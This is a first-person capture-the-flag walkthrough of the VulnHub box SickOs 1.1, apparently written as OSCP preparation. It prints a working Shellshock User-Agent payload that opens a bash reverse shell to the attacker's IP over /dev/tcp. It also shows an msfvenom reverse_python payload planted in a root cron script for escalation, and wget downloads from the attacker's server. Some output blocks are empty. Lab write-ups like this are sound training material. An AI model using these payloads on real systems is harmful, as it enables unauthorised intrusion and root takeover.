# OSCP Prep - *SickOs 1.1*

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/sickos-11,132/) and set it up with VMware Workstation 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```

```

We can first notice that port ```3128/tcp``` is open for an HTTP proxy server.

After configuring Firefox with the proxy of ```192.168.57.130:3128```, we can access the website, which has nothing really fascinating on it.

Running a gobuster scan revealed a ```robots.txt``` folder, which in it contained a ```/wolfcms``` folder.

While manually going through ```/wolfcms``` and researching what it was, I kicked off a general nikto scan of the website.

```
sudo nikto --host http://192.168.57.130 --useproxy http://192.168.57.130:3128

The scan results revealed something crucial about the website, ```Site appears vulnerable to the 'shellshock' vulnerability```.

## Step 2 - Exploitation

Not immediately knowing what this was, I did more research into what this was and how I would be able to replicate it.

My research led me to [this documentation](https://www.cybureau.org/library/wp-content/uploads/sites/3/2021/02/Blind_SSRF_with_Shellshock_Exploitation.pdf) that explains how the user executed the exploit.

According to the write-up, by inserting the payload into the ```User-Agent``` header of a captured GET request, we can follow the payload with any bash command to perform an RCE.

Therefore, using BurpSuite I made a GET request for ```{IP}/cgi-bin/status/```, intercepted it, and used a simple Bash reverse shell command.

```
GET http://192.168.57.130/cgi-bin/status HTTP/1.1
Host: 192.168.57.130
User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.57.129/5555 0>&1'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

The full payload used here was ```() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.57.129/5555 0>&1'```, where any Bash command after the first semicolon (in this case, a simple TCP connect) could be executed.

I also ran a NetCat listener to capture the connection request and was inevitably able to break into the host.

```
sudo nc -lvnp 5555                 
[sudo] password for meowmycks: 
listening on [any] 5555 ...
connect to [192.168.57.129] from (UNKNOWN) [192.168.57.130] 53647
```

I then upgraded to a TTY shell.

```
www-data@SickOs:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<i-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'

zsh: suspended  sudo nc -lvnp 5555

```

## Step 3 - Privilege Escalation

Now that I had a foothold in the server, I could focus on upgrading to root.

I set up an HTTP server on my Kali box using ```sudo python3 -m http.server 80``` to be able to download scripts to the target machine using ```wget``` commands.

By doing this, I can circumvent any potential problems with not being able to get scripts from GitHub or any other external sources, and because it's more convenient.


```
sudo python3 -m http.server 80                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Once I had the server online, I downloaded a copy of Linux Smart Enumeration (LSE) from my PC that was originally obtained from [here](https://github.com/diego-treitos/linux-smart-enumeration).

LSE allowed me to scan the host for common privilege escalation points and some additional known vulnerabilities. 
However, LSE does not include scripts to exploit said vulnerabilities should any be detected.
Therefore, I had packaged scripts in with my copy of LSE in a compressed folder for the sake of convenience.

```
wget http://192.168.57.129/lse.zip
wget http://192.168.57.129/lse.zip
--2022-06-30 19:00:04--  http://192.168.57.129/lse.zip
Connecting to 192.168.57.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22327785 (21M) [application/zip]

100%[======================================>] 22,327,785  31.9M/s   in 0.7s    

2022-06-30 19:00:04 (31.9 MB/s) - `lse.zip' saved [22327785/22327785]
```

After unzipping the folder and executing the script, I received plenty of useful information about the host.

A big thing LSE found was a couple of cron job running as root in directores I had write access in.

```

[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
```

Particularly, we had write access to the file in this job in particular: ```/etc/cron.d/automate:* * * * * root /usr/bin/python /var/www/connect.py```

Clearly this is a Python script. Whatever it originally does isn't so important as what we might be able to make it do...

... Such as implanting another reverse shell script to automatically run every minute.

To do that, I used msfvenom to craft a reverse_python payload to then write into the Python script.

```
msfvenom -p cmd/unix/reverse_python LHOST=192.168.57.129 LPORT=4444 -f raw

```

After opening another NetCat listener and waiting for a few seconds, I got a connection.

```
sudo nc -lvnp 4444                 
[sudo] password for meowmycks:

```

I upgraded the shell again (because why not), and finally got the flag.

```

## Conclusion

By the end of this box, I had learned more about doing research and figuring out how to execute exploits for known vulnerabilities.

With the recent addition of LSE to my arsenal, things became much easier (for better or worse) to do and I felt more able to progress without needlessly getting stuck on minor and unimportant details.
